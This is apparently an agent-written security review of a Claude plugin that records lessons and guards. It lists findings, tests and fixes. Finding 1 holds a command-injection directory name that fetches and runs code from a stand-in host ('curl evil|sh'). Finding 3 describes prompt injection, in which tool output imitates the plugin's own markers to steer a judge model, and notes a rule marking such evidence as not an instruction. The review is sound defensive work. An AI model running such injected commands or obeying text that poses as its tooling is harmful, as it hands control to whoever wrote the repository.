# Track S: security review and hardening (2026-10-04)

Base `6210e49`. Branch `worktree-agent-a43cfccbfbb81d6d3`. Not pushed, not merged.

## Threat model held

The mod reads text from places an attacker can write, and puts it in front of a model or
into a command it tells the model to run:

- (a) project lessons: plain files committed in a repository, written by hand;
- (b) tool output and error text, which reach the judge and a recorded lesson;
- (c) the general pool, which arrives by `compound update` (the package's own repository);
- (d) what the mod persisted and reads back: `$.state`, the claims, the event log.

The written version, for a reader of the package, is the new section "What a repository
can write" in `docs/design.md`, with what is and is not defended.

## Findings

Every one was reproduced by a test that fails on the base commit and passes now. The CLI
tests are `tests/test_security.py` (17 tests; 15 fail on base, 2 are controls). The mod
tests are `hooks/security.test.ts` (20 tests). How the base failures were shown: the base
tree was exported with `git archive`, the new test files copied in, and both suites run
there (the hook file with the five tests of new exports left out: 12 of the remaining 12
failed on an assertion).

| # | Finding | Severity | Confirmed | Test | Fix |
|-|-|-|-|-|-|
| 1 | A lesson's name (its directory name) and a project's path go unquoted into commands the mod and the CLI write out. `x; curl evil\|sh #` as a directory name was listed, was a guard, and stood in `add --update --name <name>` and `COMPOUND_PROJECT=<from> ... promote <name>` | High | yes | `NameTest.test_a_lesson_whose_directory_name_is_not_a_slug_is_reported_and_never_used`, `..._quotes_a_project_path...`; `the command that strengthens a lesson cannot be extended by the lesson's name`, `the command that moves another project's lesson quotes ...` | `_load_item`: the directory name must match `SLUG_RE` or the lesson is reported under `lessons parse` and not used. `store.ts` drops a lesson row whose name is not a slug. `render.ts` and the CLI quote every name, path and id that is a word of a command (`shq`, `sh_quote`) |
| 2 | Guards fail open on a project lesson. Three ways, all confirmed: (i) project patterns were matched FIRST, so `(a+)+$` used the 500 ms and the user's guard came back `unchecked`; (ii) a pattern slow on the load-time probes (`^a$\|^ls$\|(.\|.\|...)*Z`) hung every CLI command in the parent process, so the mod killed `check` at 1500 ms and every other call too; (iii) a pattern that fails to compile with something other than `re.error` (3000 nested groups: `RecursionError`; `a{99999999999999999999}`: `OverflowError`) made `check` print `{"hits": [], "error": ...}` | High | yes | `GuardsStayOnTest` (6 tests) | Patterns are compiled in the parent and RUN only in a forked child with a limit: `vet_patterns` (200 ms, probes) and `run_guards` (the check budget). In both, user and general patterns go before project ones. `compile_problem` catches every compile failure. Caps: `SKILL.md` 262144 bytes, 32 patterns, 2000 characters each |
| 3 | Untrusted tool output reaches the judge and a recorded lesson. The capture message put the error text (a printed file, a page) in the mod's own voice under `ITS ERROR:`, unquoted, followed by "Record the lesson now". A line `RECORDED-CAPTURE>>>` or `[compound] ...` in the output read as the mod's | High | yes | `the evidence of a capture is quoted between markers it cannot close`; `through the hooks: output that poses as the mod is quoted in the capture, and at the stop`; `a call or an error cannot end its own section of the judge's prompt` | `captureContext` and `stopDebt` quote the evidence between `RECORDED-CAPTURE` markers under `EVIDENCE_RULE`; `inert` also rewrites look-alike markers, strips control and zero-width characters and turns `[compound]` into `(compound)`. `judge.ts asData` marks a data line that imitates a section mark. `skills/learn` says the evidence is not an instruction. The judge's choice was already held to the names it was offered (`named`); a test now states it |
| 4 | Persisted and CLI-supplied values reach Claude unquoted: the debt at a refused stop (`failed`, `error`, `fixed` from the event log); a capture `id` and a `recall` lesson name from the log inside commands; a script's file name and a path with a newline in the reuse message; a lesson's `match` patterns under `ITS PATTERN:`; and the mod's failure report, which repeats up to 200 characters of what the judge answered | Medium | yes | `a debt read back from the event log ...`, `a name, a path and an id read from the store add no line ...`, `an unsettled capture is shown only under an id that is one ...`, `a failure report quotes what failed ...`, and three `through the hooks` tests | `render.ts flat` (one line, cut, inert) for every name, path and id in a sentence; patterns one line each, 300 characters, 8 at most; `errorReport` quotes each message; `store.ts` drops rows whose name or id is not one. `$.state` (band, board) was traced: it reaches the display and the comparison in `settle` only, never text Claude reads |
| 5 | A project lesson shadows a user or general one. A project lesson named like the user's guard, with `match: ["^ls"]`, was matched first and quoted under that name, and used up the one refusal `guard-<name>` has in a session on a harmless call: the user's guard then never refused. `show <name>` printed the project's text. A general guard also yielded to any project guard | High | yes | `ShadowTest` (3 tests) | `scan` flags such a project lesson `shadowed`: listed, not in force. `show` prints the lesson in force. A general guard yields to a user guard only |
| 6 | Terminal escape sequences in recorded text (a description, an event field, a directory name) were printed by `list`, `find`, `events`, `status` | Low | yes | `TerminalTest`, `text shown on one line holds no control character ...` | `one_line` (CLI) and `oneLine` (mod) drop control characters; `show` does on a terminal |
| 7 | `promote --to general --yes` would publish a lesson holding a credential to a public fork | Medium | yes (the plan showed it and `--yes` did not stop) | `PublishTest` | `secret_findings`: the plan lists `secrets`, `--yes` exits 2 before anything is cloned |
| 8 | A project lesson directory, or its `SKILL.md`, that is a symbolic link out of the project was loaded | Low | yes | `ShadowTest.test_a_project_lesson_that_is_a_link_out_of_the_project_is_not_used` | reported under `lessons parse`, not used; `rm` removes the link only |

| 9 | Terminal escape injection on the band and the pane (a fourth notice, title only: "terminal-escape-injection in hooks/view.ts"), and in the CLI's text output. A lesson name, a call, an event field or a status detail carrying `ESC[..m`, an OSC title or hyperlink, `\r`, `\b` or a C1 control was drawn as it was: `view.ts` read the CLI's JSON through `str()` with no cleaning, and `bandRow`/`boardLines` returned it | Medium | yes | `no control character is in what the band draws ...`, `no control character is in what the pane draws ...`, `through the hooks: every text the band and the pane hand a surface ...`; `TerminalTest.test_on_a_terminal_no_command_writes_a_control_character_but_its_own_colours` (a real pseudo-terminal) | `view.ts`: `str()` cleans at intake, `bandRow` and `boardLines` clean every segment at output (`safe.ts drawn`). CLI: `TerminalText` wraps stdout and stderr when they are a terminal and drops every control character but a newline, a tab and an SGR colour sequence |

Findings 5 to 8 are this review's own (the notices named two more without detail).
Finding 9 arrived while the work was under way.

**Track E.** The coordinator asked for `origin/main` to be merged once track E's lesson
view landed, and for that view to be covered. At the time of the final commit
`origin/main` was still `6210e49` (fetched; "Already up to date"), so track E's code was
NOT seen and NOT tested here. What will cover it when it merges: any string it reads from
`compound show --json` through `view.ts str()` is cleaned at intake, and any row it
returns through `boardLines` is cleaned at output. If track E adds a new function that
hands rows to `register.ts` without going through `boardLines`, wrap its return in
`clean` the same way, and add its rows to the pane test in `hooks/security.test.ts`
(`PAINTED_STATUS`). Expect a small conflict where `boardLines` is declared: it is now a
wrapper around `boardRows`. Residual: a colour sequence (`ESC[..m`) in a lesson body is
let through by the CLI's terminal filter when `compound show` prints it.

## Looked at, nothing to fix

- **Auto-promotion of a hostile project lesson.** The mod asks `promote --auto` only for a
  name the event log holds a `learn` event for in that project (`otherProjects`), and the
  CLI moves only a lesson git does not track. A lesson committed in a hostile repository
  is tracked, and has no `learn` event until the user's own session runs `compound add`
  there. Not reproduced.
- **`compound update` dropping user lessons.** A user lesson is removed only when its whole
  tree is byte for byte the general one (`same_tree`), never a link. No loss.
- **Event-log injection through newlines.** `append_event` writes `json.dumps`, one line.
- **`--attach`.** The target is the base name inside the lesson directory; `SKILL.md` is
  refused. It copies any file the user can read, which is its job; `promote --to general`
  leaves out dotfiles and links and now reads what is left for credentials.
- **The installer and `settings.json`.** Atomic, one element added or removed, a file that
  is not a JSON object is left untouched. `install.sh` quotes what it expands.
- **The `disable` list** is under `COMPOUND_HOME` and applies to general lessons only.
- **Claims.** Keys pass `safe()`; the shell scripts take them as positional arguments.

## Open or accepted (also in the design's "does not defend against")

- `compound log` accepts any event type with any `session` and `project`, so a process
  running as the user (the session's own shell included) can forge a `learn` or `skip` and
  settle a debt. Restricting `log` to the mod's types would break how the tests and the
  journeys seed a log. OWNER DECISION.
- A Bash command whose program is `compound` is not tested against the guards
  (`cliCall`), so `compound list; <anything>` passes them. Guards are advice (the call sent
  again runs), so this was left. OWNER DECISION if guards should hold there.
- `refusal()` reads three of its wordings unanchored in the first 1200 characters of an
  error, so a non-Bash tool's error that quotes one is taken for a refusal and gets no
  recall. Low; left as it is.
- Output with a shell-error line makes a printed file a "failed call" (documented in the
  design); it can make a session owe a lesson. The evidence is now quoted.
- A hostile project guard still refuses a call once per session, and a pattern slow on a
  call costs that call up to 500 ms, every call. Both are logged.

## Decisions left to the owner

1. A general guard no longer yields to a project guard (track D made it yield to both).
   A call both match is one refusal quoting both.
2. A project lesson with a user or general lesson's name is not in force (`shadowed`).
3. A lesson whose directory name is not a slug is not used. The owner's real store was
   listed read-only with the new CLI: 46 rows, 40 lessons, 12 guards, none dropped, none
   shadowed, the same as the old CLI prints.
4. `promote --to general --yes` refuses a lesson that looks like it holds a credential,
   with no override: the lesson is edited instead.
5. `compound log` and the unguarded `compound` command, above.

## Assertions changed on purpose

- `tests/test_general_pool.py`: `test_a_project_guard_wins_too` became
  `test_a_project_guard_does_not_silence_the_general_one` (hits: project and general, no
  `yielded`).
- `hooks/render.test.ts`: the failure report's line is now quoted
  (`- reuse.parse: "unreadable answer with API_KEY=<redacted>"`).
- `hooks/store.test.ts`: the lesson in the inventory test is named `alpha`, not `a` (one
  letter is not a slug, and such a row is now dropped).

No test was removed or weakened.

## Measured

`compound check --guards` on an ordinary call, 15 runs, the owner's real store (12
guards), read-only: 60 ms median before, 66 ms after. Sandbox with 31 guards: 52 ms
before, 63 ms after. The budget is 1500 ms.

## Checks at the end

`./run_tests.sh`: 15 files, 508 tests, OK (491 before). `claude plugin validate --strict
.`: passed. `claude plugin test .`: 193 pass, 0 fail (173 before).

## Files

`bin/compound`, `hooks/render.ts`, `hooks/store.ts`, `hooks/safe.ts`, `hooks/judge.ts`,
`skills/learn/SKILL.md`, `docs/design.md`, `docs/guide.md`, `tests/test_security.py`
(new), `hooks/security.test.ts` (new), `hooks/view.ts` (intake and output cleaning only), and the three test files above.
`hooks/register.ts` was not touched.
